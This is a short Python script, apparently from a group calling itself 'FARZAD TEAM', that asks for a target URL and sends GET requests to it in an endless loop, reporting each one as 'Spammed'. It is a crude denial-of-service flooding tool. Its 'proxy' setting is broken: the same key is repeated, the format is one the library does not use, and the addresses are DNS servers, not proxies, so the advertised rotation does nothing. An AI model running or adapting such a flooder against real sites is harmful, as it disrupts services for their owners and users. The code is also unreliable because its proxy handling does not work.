import requests
import time
from time import sleep
import pystyle
from pystyle import *

Write.Print("Welcome \nCreated By FARZAD13\nFARZAD TEAM ON TOP!!",Colors.rainbow,interval=0.001)
time.sleep(2)

url = input("Enter The Url ->")

proxy = {
  "proxy":"1.1.1.1",
  "proxy":"4.4.4.4",
  "proxy":"8.8.8.8",
  "proxy":"5.5.5.5",
}
while True:
    r = requests.get(url, proxies=proxy)
    if(r.status_code==200):
        print("Spammed! Site Is Up")
    if(r.status_code!=200):
        print("Faild! Site Is Down!")
